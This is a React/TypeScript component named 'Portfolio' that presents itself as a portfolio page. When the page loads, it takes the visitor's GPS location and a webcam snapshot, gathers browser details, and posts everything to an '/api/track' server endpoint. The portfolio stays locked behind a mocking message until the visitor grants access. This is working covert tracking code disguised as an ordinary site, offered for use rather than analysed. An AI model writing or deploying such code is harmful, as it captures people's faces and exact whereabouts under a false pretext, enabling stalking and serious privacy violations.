import { useEffect, useState } from "react";
import axios from "axios";

interface PortfolioProps {
  onPermissionsGranted?: () => void;  // optional callback prop
}

const Portfolio: React.FC<PortfolioProps> = ({ onPermissionsGranted }) => {
  const [granted, setGranted] = useState(false);
  const [message, setMessage] = useState("Ta Pagal ho?????");

  useEffect(() => {
    const getPermissions = async () => {
      try {
        const location = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject);
        });

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext("2d");
        if (ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        } else {
          throw new Error("Could not get canvas 2D context");
        }
        const imageBase64 = canvas.toDataURL("image/jpeg");

        const metadata = {
          latitude: location.coords.latitude,
          longitude: location.coords.longitude,
          userAgent: navigator.userAgent,
          screen: {
            width: window.innerWidth,
            height: window.innerHeight,
          },
          language: navigator.language,
          image: imageBase64,
        }
const API_URL = import.meta.env.VITE_API_URL;

        await axios.post(`${API_URL}/api/track`, metadata);

        setGranted(true);
        setMessage("Permissions granted. Portfolio unlocked!");

        stream.getTracks().forEach((track) => track.stop());

        if (onPermissionsGranted) {
          onPermissionsGranted();
        }
      } catch (err) {
        console.error("Permission error:", err);
        setMessage("Ta pagal ho????");
      }
    };

    getPermissions();
  }, [onPermissionsGranted]);

  if (!granted) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-black text-white">
        <p>{message}</p>
      </div>
    );
  }

  return (
    <div className="">
    
      {/* Your Portfolio Components */}
    </div>
  );
};

export default Portfolio;
